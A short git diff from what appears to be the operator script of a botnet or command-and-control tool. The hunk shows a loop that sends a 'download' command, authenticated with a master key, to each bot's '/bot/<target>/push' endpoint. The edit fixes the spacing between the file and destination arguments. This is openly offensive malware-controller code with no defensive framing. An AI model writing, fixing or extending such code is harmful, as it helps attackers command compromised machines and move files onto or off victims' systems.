@@ -250,7 +250,7 @@ ___  ___          _              _____                       _
         for target in target_list:
             url = URL + '/bot/' + target + '/push'
             masterkey = MASTERKEY
-            cmd = "download " + args.file + args.destination 
+            cmd = "download " + args.file + " " + args.destination 
 
             data = {'masterkey': masterkey, 'cmd': cmd}
             res = requests.post(url, data=data)
